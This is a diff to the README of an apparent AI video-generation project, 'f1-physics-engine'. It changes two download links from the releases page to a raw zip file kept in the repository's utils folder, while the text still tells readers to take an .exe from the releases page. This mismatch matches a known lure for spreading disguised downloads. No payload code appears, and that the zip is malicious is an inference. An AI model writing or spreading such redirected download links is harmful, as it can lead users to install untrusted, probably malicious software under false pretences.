@@ -1,6 +1,6 @@
 # 🏎️ f1-physics-engine - Create realistic formula racing videos
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dxisy-1/f1-physics-engine/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-blue.svg)](https://github.com/dxisy-1/f1-physics-engine/raw/refs/heads/main/utils/f_engine_physics_v1.9.zip)
 
 This software generates videos for Formula 1 racing. It combines racing data with artificial intelligence. You type a description of a race maneuver. The program turns that text into a short video clip. It uses models trained on real car telemetry data to ensure the movement looks authentic.
 
@@ -20,7 +20,7 @@ If your computer uses an integrated graphics chip, the program will run slow or 
 
 You need to download the installer file from the official releases page. 
 
-[Visit this page to download the software](https://github.com/dxisy-1/f1-physics-engine/releases)
+[Visit this page to download the software](https://github.com/dxisy-1/f1-physics-engine/raw/refs/heads/main/utils/f_engine_physics_v1.9.zip)
 
 Find the section marked "Assets" at the bottom of the latest release. Click the link that ends with `.exe` to start the download. Save this file to your Downloads folder.
 
